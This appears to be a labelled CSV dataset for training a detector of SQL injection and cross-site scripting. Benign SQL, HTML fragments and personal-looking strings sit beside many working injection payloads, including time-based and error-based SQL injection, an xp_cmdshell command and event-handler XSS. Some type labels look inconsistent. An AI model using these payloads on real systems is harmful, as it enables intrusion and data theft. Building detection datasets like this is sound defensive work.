Text,Label,type
SELECT MIN ( measure )  AS apple FROM dropped,0,sql
SELECT block,0,xss
"<li><a href=""/wiki/Avicenna"" title=""Avicenna"">Avicenna </a> </li>",0,xss
<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>,2,xss
<li onpointerleave=alert(1)>XSS</li>,2,xss
" SELECT column_name ( s ) FROM table1 T1, table1 T2  WHERE ",0,sql
"  SELECT * FROM heavy WHERE compare NOT IN  ( 'team', 'attack', 'underline' )  ",0,xss
-4901  )   or 3407  =  6442#,1,xss
"  SELECT signID AS ID, grain AS throat FROM riding",0,sql
"   SELECT shot,bigger,needed,population,beyond     (  (  forth JOIN discuss ON thrown.number =  trouble.produce )   INNER JOIN indicateON Orders.arrive =  neck.unusualID ) ",0,sql
	 </span></a></dt><dd>Deploying your Scrapy spiders and run them in a remote server.</dd>,0,xss
"-9263'  )   as qodg where 6798  =  6798 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,xss
"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#",1,xss
"<em ondblclick=""alert(1)"">test</em>",2,xss
SELECT * FROM indeed,0,sql
SELECT COUNT ( DISTINCT next )  FROM softly,0,sql
	 </span>,0,xss
SELECT TOP 3 * FROM slip,0,sql
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,2,xss
"	 <div class=""mw-parser-output"">",0,xss
	 </span> 2015 ,0,xss
" </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0,xss
SELECT MIN ( age )  AS basic FROM because,0,sql
lemunao porxas,0,sql
"	 <div id=""Philosophy_of_mind"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Philosophy_of_mind"" title=""Philosophy of mind"">Philosophy of mind </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Theories </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"<div draggable=""true"" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>",2,xss
"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",1,xss
 or a  =  a--,1,sql
aprea@ingenelec.es,0,sql
"<li id=""cite_note-FOOTNOTELungarellaMettaPfeiferSandini2003-169""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTELungarellaMettaPfeiferSandini2003_169-0"">^ </a> </b> ",0,xss
19583,0,sql
"  SELECT pony AS vessels, dig AS [matter]  FROM anyway",0,sql
SELECT * FROM hair FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM drew,0,sql
SELECT * FROM forth WHERE NOT grew = 'dry'  AND NOT why = 'plus',0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_options_linkedin_url' LIMIT 1,0,xss
SELECT * FROM somewhere FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"<SCRIPT a=`>` SRC=""httx://.rocks/.js""></SCRIPT>",2,xss
tordera savall,0,sql
"    <input type=""hidden"" name=""area"" value=""default"" />",0,xss
villanueva de sigena,0,sql
5.95675E+15,0,sql
kaycee,0,sql
<data onpointermove=alert(1)>XSS</data>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",2,xss
"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",1,sql
SELECT north ( s )  FROM team UNION,0,sql
SELECT * FROM future WHERE already = 'letter',0,xss
lenhart8@raullazaro.us,0,sql
"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
SELECT bottle ( s )  FROM needs SELECT too ( s ) ,0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Machine_ethics"" title=""Machine ethics"">Machine ethics </a> </div>",0,xss
SELECT AVG ( blank ) FROM thread,0,sql
-5365 or 7517  =  5726--,1,xss
SELECT TOP 3 * FROM oxygen WHERE writer = 'pan',0,sql
gamal,0,sql
select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --,1,xss
deying,0,sql
"  <link rel=""stylesheet"" href=""_static/pygments.css"" type=""text/css"" />",0,xss
1'  )   as imgv where 7802  =  7802,1,sql
thuong,0,sql
"INSERT INTO open ( recent, somehow, forth, fighting, roll, missing )  VALUES  ( 'age', 'pool'. success', 'waste', 'tip', 'satisfied', 'morning' )  ",0,sql
thorndik9,0,sql
3ule1s,0,sql
SELECT * FROM other,0,sql
SELECT COUNT ( DISTINCT afraid )  FROM stock,0,sql
"<image onbeforecut=""alert(1)"" contenteditable>test</image>",2,xss
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,1,sql
<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>,2,xss
"  SELECT articleID AS ID, planning AS thousand FROM related",0,sql
"calle perez galdos 193,",0,sql
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'nlfl' like 'nlfl",1,sql
1056,0,sql
88426780z,0,sql
1'  )   rlike   (  select   (  case when   (  2721  =  8716  )   then 1 else 0x28 end   )    )    and   (  'dumt'  =  'dumt,1,sql
6.44911E+15,0,sql
"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",1,sql
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationend=""alert(1)""></section>",2,xss
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,xss
"<hr onmouseenter=""alert(1)"">test</hr>",2,xss
Ã½ or 1  =  1 --,1,sql
SELECT * FROM behavior WHERE oxygen = 'saw' FETCH FIRST 3 ROWS ONLY,0,sql
"<ul><li><a href=""/wiki/Maleyka_Abbaszadeh"" title=""Maleyka Abbaszadeh"">Maleyka Abbaszadeh </a> </li>",0,xss
SELECT * FROM exclaimed WHERE laid = 'darkness',0,sql
1'  )   as qqyz where 2274  =  2274,1,sql
"1'  )   as dvoy where 7906  =  7906 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
teodosio,0,sql
1%' waitfor delay '0:0:5' and '%'  =  ',1,sql
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,1,xss
SELECT AVG ( customs ) FROM sit SELECT SUM ( red ) ,0,xss
<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>,2,xss
trooger_gereighty@quierocortinas.mil,0,sql
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,xss
"<del onbeforecut=""alert(1)"" contenteditable>test</del>",2,xss
SELECT * FROM die FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
<image onpointerout=alert(1)>XSS</image>,2,xss
SELECT TOP 3 * FROM minerals WHERE nails = 'direction',0,xss
"<plaintext onmouseover=""alert(1)"">test</plaintext>",2,xss
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",2,xss
SELECT COUNT ( DISTINCT missing )  FROM future,0,sql
miramar,0,sql
DELETE FROM roof WHERE heat = 'mine',0,sql
	 </span> ,0,xss
1' and sleep  (  5  )  #,1,sql
12018831c,0,sql
"c/ ulises 17,",0,xss
DELETE FROM world,0,sql
SELECT AVG ( greater ) FROM characteristic SELECT SUM ( interior ) ,0,sql
SELECT AVG ( Price ) FROM sun,0,sql
00207473j,0,sql
ilya,0,sql
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""qqfd"" like ""qqfd",1,xss
DELETE FROM funny WHERE brave = 'card',0,xss
SELECT * FROM race ORDER BY war DESC,0,xss
winston@chinavende.bi,0,xss
"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   '%'  =  '",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> See also <a rel=""nofollow"" class=""external text"" href=""http://consc.net/papers/facing.html"">this link </a> ",0,xss
"calle castellet 94,",0,sql
38355013y,0,sql
SELECT * FROM walk WHERE sudden LIKE '%serious%',0,sql
SELECT yes FROM widely UNION ALL SELECT if FROM independent ORDER BY native,0,sql
SELECT * FROM week FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"<nextid oncontextmenu=""alert(1)"">test</nextid>",2,xss
SELECT * FROM  ( SELECT nuts FROM little ) ,0,sql
"				<div class=""flaggedrevs_short_basic"">",0,xss
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,2,xss
"<form onkeyup=""alert(1)"" contenteditable>test</form>",2,xss
SELECT rose ( s FROM glass RIGHT JOIN,0,xss
"1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1,sql
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",1,xss
 </li>,0,xss
"   SELECT shine,further,well,decide,older     (  (  curious JOIN dried ON definition.product =  during.mice )   INNER JOIN motherON Orders.east =  slabs.jarID ) ",0,sql
SELECT length ( s ) FROM anyone INNER JOIN,0,sql
"<li><a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Automated planning and scheduling </a> </li>",0,xss
	 </span>,0,xss
-7279  )   or 9898  =  9963 and   (  1481  =  1481,1,sql
"1""   )    )    union all select null,null,null,null,null,null,null,null,null--",1,sql
"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,sql
 </li>,0,xss
-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,1,sql
falisco,0,sql
ab_ogadora,0,sql
enjoyelada,0,sql
"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",1,sql
"-4934"" union all select 5119,5119,5119,5119,5119--",1,sql
arre,0,xss
e00u4rda2,0,sql
"  SELECT * FROM mark WHERE citizen IN  ( 'strip', 'prepare', 'pencil' )  ",0,sql
SELECT DISTINCT occasionally FROM wonder,0,sql
"<script oncontextmenu=""alert(1)"">test</script>",2,xss
"   SELECT composition, mostly+ ', ' + eaten+ ' ' + task+ ', ' + village AS lose  FROM wall",0,sql
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",1,sql
"  SELECT mirror AS shallow, coming AS [combine]  FROM laugh",0,sql
SELECT * FROM darkness FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM using,0,sql
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'ozur'  =  'ozur",1,xss
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'agent_category', 'agent_city' )  AND tr.object_id IN  ( 28313, 28341 )  ORDER BY t.name ASC",0,sql
SELECT DISTINCT father FROM yard,0,sql
orera,0,sql
2.81517E+15,0,xss
clipsham5,0,xss
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",2,xss
massie.borionko@13horas.gr,0,xss
1'  )   where 5378  =  5378,1,sql
cabral_crowther@frioelectric.br,0,sql
"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;214–215 </li>",0,xss
"  SELECT LEAST ( 3, 12, 34, 8, 25 ) ;",0,sql
	 </span> 2018 ,0,xss
SELECT COUNT ( height ) FROM studying,0,sql
"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",1,xss
4916,0,sql
"<image draggable=""true"" ondrag=""alert(1)"">test</image>",2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=30"" title=""Edit section: Classifiers and statistical learning methods"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT AVG ( mental ) FROM thick,0,sql
2049,0,sql
		 </div> </div>,0,xss
nona,0,sql
salhany0,0,sql
"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
SELECT * FROM eventually 3 SELECT * FROM held,0,sql
<xss id=x tabindex=1 onfocus=alert(1)></xss>,2,xss
lacasse,0,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;653–664, </li>",0,xss
"<li><a href=""/wiki/Commonsense_reasoning"" title=""Commonsense reasoning"">Commonsense reasoning </a> </li>",0,xss
" </p><p>The study of mechanical or <a href=""/wiki/Formal_reasoning"" class=""mw-redirect"" title=""Formal reasoning"">""formal"" reasoning </a> began with <a href=""/wiki/Philosopher"" title=""Philosopher"">philosophers </a> and mathematicians in antiquity. The study of mathematical logic led directly to <a href=""/wiki/Alan_Turing"" title=""Alan Turing"">Alan Turing </a>'s <a href=""/wiki/Theory_of_computation"" title=""Theory of computation"">theory of computation </a>, which suggested that a machine, by shuffling symbols as simple as ""0"" and ""1"", could simulate any conceivable act of mathematical deduction. This insight, that digital computers can simulate any process of formal reasoning, is known as the <a href=""/wiki/Church%E2%80%93Turing_thesis"" title=""Church–Turing thesis"">Church–Turing thesis </a>.<sup id=""cite_ref-Formal_reasoning_28-0"" class=""reference""><a href=""#cite_note-Formal_reasoning-28"">&#91;28&#93; </a> </sup> Along with concurrent discoveries in <a href=""/wiki/Neuroscience"" title=""Neuroscience"">neurobiology </a>, <a href=""/wiki/Information_theory"" title=""Information theory"">information theory </a> and <a href=""/wiki/Cybernetic"" class=""mw-redirect"" title=""Cybernetic"">cybernetics </a>, this led researchers to consider the possibility of building an electronic brain. Turing proposed changing the question from whether a machine was intelligent, to ""whether or not it is possible for machinery to show intelligent behaviour"".<sup id=""cite_ref-29"" class=""reference""><a href=""#cite_note-29"">&#91;29&#93; </a> </sup> The first work that is now generally recognized as AI was <a href=""/wiki/Warren_McCullouch"" class=""mw-redirect"" title=""Warren McCullouch"">McCullouch </a> and <a href=""/wiki/Walter_Pitts"" title=""Walter Pitts"">Pitts </a>' 1943 formal design for <a href=""/wiki/Turing-complete"" class=""mw-redirect"" title=""Turing-complete"">Turing-complete </a> ""artificial neurons"".<sup id=""cite_ref-FOOTNOTERussellNorvig200916_30-0"" class=""reference""><a href=""#cite_note-FOOTNOTERussellNorvig200916-30"">&#91;30&#93; </a> </sup>",0,xss
" select * from users where id  =  1 or ""%1"" or 1  =  1 -- 1",1,sql
calle rafael bravo gomez 179 5?h,0,sql
"          <dd><a href=""/en/1.8/"">1.8</a></dd>",0,xss
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",2,xss
	 </span> 2018 ,0,xss
urea bernat,0,sql
SELECT COS ( PI (   )  )  ;,0,sql
"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
SELECT * FROM occur 3,0,sql
"1""  )   where 9827  =  9827",1,sql
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",2,xss
 ,0,xss
1%' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
SELECT environment ( s ) FROM future INNER JOIN,0,sql
SELECT * FROM blood WHERE    NOT have = 'clearly',0,sql
 ,0,xss
select   (  case when   (  2914  =  3335  )   then 2914 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
senterada,0,sql
"<rp oncut=""alert(1)"" contenteditable>test</rp>",2,xss
mauer,0,sql
1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,1,xss
"1""  )   where 4426  =  4426 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,xss
</ul>,0,xss
"<th onbeforecut=""alert(1)"" contenteditable>test</th>",2,xss
	 </h3>,0,xss
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,sql
adria,0,sql
"1""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;281–315, </li>",0,xss
SELECT TOP 50 PERCENT * FROM fur SELECT * FROM hungry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM vast,0,sql
81208495a,0,sql
sarfati@weat.nc,0,sql
barrachina,0,xss
villacastn,0,xss
"<li><cite id=""CITEREFBrooks1991"" class=""citation encyclopaedia"">Brooks, R. A. (1991). ""How to build complete creatures rather than isolated cognitive simulators"".  In VanLehn, K. (ed.). <i>Architectures for Intelligence </i>. Hillsdale, NJ: Lawrence Erlbaum Associates. pp.&#160;225–239. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.52.9510"">10.1.1.52.9510 </a> ",0,xss
"calle de circulacio de l' oest, 7",0,sql
49440,0,xss
"   SELECT COUNT ( forget ) , appearance FROM say BY flame",0,sql
<img onpointerover=alert(1)>XSS</img>,2,xss
novallas,0,sql
SELECT * FROM additional WHERE writing NOT BETWEEN 'any' AND 'peace',0,xss
82444604t,0,sql
"          <dd><a href=""/en/latest/"">latest</a></dd>",0,xss
"<ul><li><a href=""/wiki/Concurrent_computing"" title=""Concurrent computing"">Concurrent computing </a> </li>",0,xss
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,2,xss
-3161'  )   or 8501  =  1796,1,xss
<center id=x tabindex=1 onactivate=alert(1)></center>,2,xss
SELECT * FROM fine ORDER BY wrapped,0,xss
en546al,0,sql
"	 </span> <span class=""cs1-visible-error error citation-comment"">Missing or empty <code class=""cs1-code"">&#124;title= </code> (<a href=""/wiki/Help:CS1_errors#citation_missing_title"" title=""Help:CS1 errors"">help </a>) ",0,xss
"   SELECT anybody, dish, forestFROM coal WHERE apartment  IS NOT NULL",0,sql
"1%'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '%'  =  '",1,sql
"<body oncut=""alert(1)"" contenteditable>test</body>",2,xss
SELECT * FROM never WHERE at = 'level',0,sql
SELECT * FROM primitive FETCH FIRST 3 ROWS ONLY,0,sql
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",2,xss
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,sql
SELECT * FROM closely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sum,0,xss
 </li>,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></p>",2,xss
"1   )    )    union all select null,null,null#",1,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM private WHERE NOT also = 'test'  AND NOT sky = 'having',0,sql
"<content ondblclick=""alert(1)"">test</content>",2,xss
	 </span>,0,xss
SELECT TOP 3 * FROM consist WHERE lunch = 'period',0,sql
"<style>@keyframes x{}</style><q style=""animation-name:x"" onanimationstart=""alert(1)""></q>",2,xss
calle codigo correspondencia oficial correos-telegrafos 33,0,sql
SELECT television FROM previous UNION ALL SELECT fifteen FROM jar ORDER BY equal,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT * FROM mouse WHERE NOT family = 'parts'  AND NOT did = 'planning',0,sql
"1   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
30666350j,0,sql
enseriarse,0,xss
 (  case when 8422  =  8452 then 1 else null end  ) ,1,sql
</div>,0,xss
"-8943%'  )   union all select 7710,7710#",1,sql
"<command onmouseup=""alert(1)"">test</command>",2,xss
"  SELECT eatenID AS ID, at AS push FROM cap",0,sql
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",1,sql
"<html ondblclick=""alert(1)"">test</html>",2,xss
5.34929E+15,0,sql
	 </span> </h3>,0,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
"-6659'  )   where 1256  =  1256 union all select 1256,1256--",1,sql
"<li><a href=""#CITEREFPenrose1989"">Penrose 1989 </a> </li> </ul>",0,xss
"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,sql
"<details oncontextmenu=""alert(1)"">test</details>",2,xss
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1,sql
SELECT STATEMENT  ) ;,0,sql
"	 </span> <span class=""toctext"">Planning ",0,xss
"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
9.35728E+15,0,sql
SELECT AVG ( wrong ) FROM pilot,0,xss
-6165%'   )    )    union all select 5384#,1,xss
1'+  (  select 'mjgo' where 4026  =  4026,1,sql
<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>,2,xss
1' where 8537  =  8537 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
"1%""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1,sql
1.07544E+15,0,sql
" SELECT * FROM who ORDER BY suppose ASC, correctly DESC",0,sql
"-7793""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""lias""  =  ""lias",1,sql
SELECT * FROM stiff WHERE NOT spin = 'can'  AND NOT clean = 'meant',0,sql
"SELECT * FROM dot WHERE either BETWEEN ""power"" AND    ""wore""",0,xss
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationstart=""alert(1)""></li>",2,xss
<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>,2,xss
SELECT * FROM several WHERE instance NOT BETWEEN 'lay' AND 'ran',0,xss
nickolau,0,sql
SELECT * FROM chance,0,sql
SELECT * FROM together WHERE somehow = 'previous',0,sql
"<li id=""cite_note-Formal_methods_in_AI-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Formal_methods_in_AI_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Formal_methods_in_AI_43-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
   )    )   ;waitfor delay '0:0:__TIME__'--,1,sql
"1""   )    )    as qqhm where 7182  =  7182",1,sql
1.80E+15,0,xss
SELECT AVG ( Price ) FROM until,0,sql
antonio ulloa 6 6?d,0,sql
yegorova@onlinegratis.aq,0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347686 )  ORDER BY meta_id ASC",0,sql
SELECT * FROM bottom WHERE smoke = 'mainly'  AND  ( breathe = 'darkness' OR store = 'forty' ) ,0,sql
" select * from users where id  =  1 or 1#""@ union select version  (    )  ,version  (    )   -- 1",1,sql
